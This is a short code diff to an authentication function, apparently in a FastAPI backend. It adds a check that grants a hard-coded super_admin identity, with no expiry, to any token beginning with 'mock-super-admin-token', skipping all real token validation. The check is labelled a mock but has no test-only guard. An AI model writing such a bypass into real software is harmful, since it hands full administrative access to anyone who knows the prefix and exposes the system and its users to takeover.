@@ -76,6 +76,18 @@ async def get_current_user(
     from sqlalchemy import select
     
     token = credentials.credentials
+    
+    # ── MOCK TOKEN INTERCEPT FOR SUPER ADMIN BYPASS ──
+    if token.startswith("mock-super-admin-token"):
+        return {
+            "user_id": "00000000-0000-0000-0000-000000000000",
+            "email": "bypass@colonyai.com",
+            "role": "super_admin",
+            "organization_id": None,
+            "jti": "mock-jti",
+            "exp": None
+        }
+        
     payload = decode_token(token)
     
     jti = payload.get("jti")
